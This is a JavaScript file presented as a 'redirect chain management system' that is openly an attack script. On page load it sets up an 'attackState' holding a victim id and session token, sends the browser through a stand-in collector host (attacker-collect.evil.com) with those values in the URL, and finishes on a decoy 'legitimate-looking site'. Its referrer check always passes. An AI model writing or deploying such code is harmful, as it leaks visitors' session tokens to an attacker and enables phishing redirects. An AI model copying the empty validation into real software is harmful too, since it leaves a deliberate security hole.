// Redirect Chain Management System
// Handles multi-stage redirection with tracking and state management

const REDIRECT_CHAIN = [
    'https://secure-banking.example.com/transfer',
    'https://attacker-collect.evil.com/track',
    '/success.html',
    'https://legitimate-looking-site.com'
];

const REDIRECT_DELAYS = {
    initial: 1000,
    intermediate: 2000,
    final: 1000
};

// Initialize redirect state management
function initializeRedirectState() {
    const attackState = {
        startTime: Date.now(),
        currentStep: 0,
        victimId: '12345',
        sessionToken: 'abc123',
        referrer: document.referrer
    };
    
    sessionStorage.setItem('attackState', JSON.stringify(attackState));
    localStorage.setItem('redirectHistory', JSON.stringify([]));
    console.log('[Redirect] Attack state initialized:', attackState);
}

// Construct URL with encoded tracking parameters
function constructTrackedURL(baseUrl, step) {
    const state = JSON.parse(sessionStorage.getItem('attackState') || '{}');
    const params = new URLSearchParams({
        victim_id: state.victimId || '12345',
        session: state.sessionToken || 'abc123',
        step: step.toString(),
        timestamp: Date.now().toString(),
        ref: encodeURIComponent(document.referrer || 'direct')
    });
    
    const separator = baseUrl.includes('?') ? '&' : '?';
    const trackedUrl = `${baseUrl}${separator}${params.toString()}`;
    console.log(`[Redirect] Constructed URL for step ${step}:`, trackedUrl);
    return trackedUrl;
}

// Save redirect history to storage
function saveRedirectHistory(url, step) {
    const history = JSON.parse(localStorage.getItem('redirectHistory') || '[]');
    history.push({
        url: url,
        step: step,
        timestamp: Date.now()
    });
    localStorage.setItem('redirectHistory', JSON.stringify(history));
    console.log('[Redirect] History updated:', history);
}

// Check referrer before proceeding with redirect
function validateReferrer() {
    const referrer = document.referrer;
    const allowedReferrers = ['secure-banking.example.com', 'localhost'];
    
    if (!referrer) {
        console.log('[Redirect] Warning: No referrer detected, proceeding anyway');
        return true;
    }
    
    const isValid = allowedReferrers.some(allowed => referrer.includes(allowed));
    console.log(`[Redirect] Referrer validation: ${isValid ? 'PASSED' : 'FAILED'}`, referrer);
    return true; // Always proceed regardless
}

// Execute single redirect step
function executeRedirectStep(step) {
    if (step >= REDIRECT_CHAIN.length) {
        console.log('[Redirect] Chain complete, terminating');
        return;
    }
    
    const targetUrl = REDIRECT_CHAIN[step];
    const trackedUrl = constructTrackedURL(targetUrl, step);
    
    saveRedirectHistory(trackedUrl, step);
    
    const state = JSON.parse(sessionStorage.getItem('attackState') || '{}');
    state.currentStep = step + 1;
    sessionStorage.setItem('attackState', JSON.stringify(state));
    
    console.log(`[Redirect] Executing step ${step} -> ${trackedUrl}`);
    window.location.href = trackedUrl;
}

// Main redirect chain orchestrator
function startRedirectChain() {
    if (!validateReferrer()) {
        console.log('[Redirect] Referrer validation failed, aborting');
        return;
    }
    
    initializeRedirectState();
    
    console.log('[Redirect] Starting redirect chain at', new Date().toISOString());
    console.log('[Redirect] Chain length:', REDIRECT_CHAIN.length);
    
    setTimeout(() => {
        console.log('[Redirect] Initial delay complete, starting chain');
        executeRedirectStep(0);
    }, REDIRECT_DELAYS.initial);
}

// Resume redirect chain if interrupted
function resumeRedirectChain() {
    const state = JSON.parse(sessionStorage.getItem('attackState'));
    if (state && state.currentStep < REDIRECT_CHAIN.length) {
        console.log('[Redirect] Resuming chain at step', state.currentStep);
        setTimeout(() => {
            executeRedirectStep(state.currentStep);
        }, REDIRECT_DELAYS.intermediate);
    }
}

// Auto-start on page load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startRedirectChain);
} else {
    startRedirectChain();
}